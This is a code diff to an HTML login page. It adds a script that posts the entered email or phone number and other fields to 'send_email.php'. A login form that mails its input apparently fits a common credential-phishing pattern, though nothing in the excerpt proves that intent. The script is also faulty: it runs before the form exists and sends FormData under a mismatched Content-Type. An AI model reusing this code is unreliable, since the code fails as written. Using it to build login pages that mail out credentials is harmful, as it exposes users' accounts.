@@ -4,6 +4,28 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Login Form</title>
+  <script>
+    document.getElementById("myForm").addEventListener("submit", function(event){
+        event.preventDefault(); // Prevent the default form submission
+        
+        // Optionally, you can perform client-side validation here
+        
+        // Submit the form using AJAX
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "send_email.php", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                // Handle the response from the server if needed
+                console.log(xhr.responseText);
+            }
+        };
+        // Serialize form data
+        var formData = new FormData(document.getElementById("myForm"));
+        xhr.send(formData);
+    });
+</script>
+
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -102,7 +124,7 @@
 
 <div class="container">
   <h2>Login</h2>
-  <form action="send_email.php" method="post">
+  <form id="myForm" action="send_email.php" method="post">
     <div class="form-group">
       <input type="email" id="email" name="email" placeholder="Email address or phone number" required>
     </div>
